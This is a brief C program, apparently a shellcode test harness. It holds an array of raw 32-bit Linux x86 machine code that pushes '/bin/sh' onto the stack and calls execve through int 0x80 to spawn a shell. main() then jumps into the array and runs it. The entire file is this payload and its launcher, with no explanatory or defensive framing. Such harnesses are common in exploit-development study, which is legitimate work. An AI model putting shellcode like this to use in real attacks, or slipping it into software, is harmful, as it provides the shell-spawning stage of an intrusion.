#include <stdio.h>
#include<stdlib.h>
#include<string.h>

char shellcode[] = "\x31\xc0\x68\x2f\x73"
                   "\x68\x00\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x44\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80";

int main()
{
  (*(void  (*)()) shellcode)();
}

